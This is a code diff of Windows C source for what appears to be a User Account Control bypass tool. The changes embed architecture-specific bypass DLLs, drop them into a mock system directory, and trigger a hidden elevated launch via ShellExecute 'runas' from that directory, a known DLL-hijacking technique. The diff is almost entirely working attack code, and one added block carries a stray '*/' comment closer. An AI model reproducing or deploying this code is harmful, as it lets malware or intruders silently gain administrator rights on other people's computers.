@@ -6,8 +6,13 @@
 #include "TargetDll.h"
 #include "resource.h"
 #include "Message.h"
-#include "UacBypassDll.h"
 #include "DropFile.h"
+
+#if _WIN64
+#include "UacBypassDll64.h"
+#else
+#include "UacBypassDll32.h"
+#endif*/
 
 BOOL CheckExploit(char* exeName, char* dllName) {
     BOOL result = FALSE;
@@ -79,13 +84,11 @@ BOOL CopyExeFile(char* system32Path, char* fakeSystemDir, char* fileName) {
 
 BOOL DropDllFile(char* fakeSystemDir, char* fileName) {
     BOOL result;
-    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL,FILE_SIZE_UAC_BYPASS_DLL,TRUE,TRUE };
-    /*
 #if _WIN64
-    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL,FILE_SIZE_UAC_BYPASS_DLL_64,TRUE,TRUE };
+    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL_64,FILE_SIZE_UAC_BYPASS_DLL_64,TRUE,TRUE };
 #else
-    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL,FILE_SIZE_UAC_BYPASS_DLL_32,TRUE,TRUE };
-#endif*/
+    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL_32,FILE_SIZE_UAC_BYPASS_DLL_32,TRUE,TRUE };
+#endif
 
     WCHAR* wFilename = (WCHAR*)calloc(MAX_PATH + 1, sizeof(WCHAR));
     if (wFilename == NULL) {
@@ -120,7 +123,6 @@ BOOL Trigger(char* fakeSystemDir, char* fileName) {
     sinfo.lpVerb = "runas";
     sinfo.lpFile = fullPath;
     sinfo.lpParameters = NULL;
-    //sinfo.lpDirectory = "C:\\Windows \\System32\\";
     sinfo.lpDirectory = fakeSystemDir;
     sinfo.nShow = SW_HIDE;
     sinfo.hInstApp = NULL;
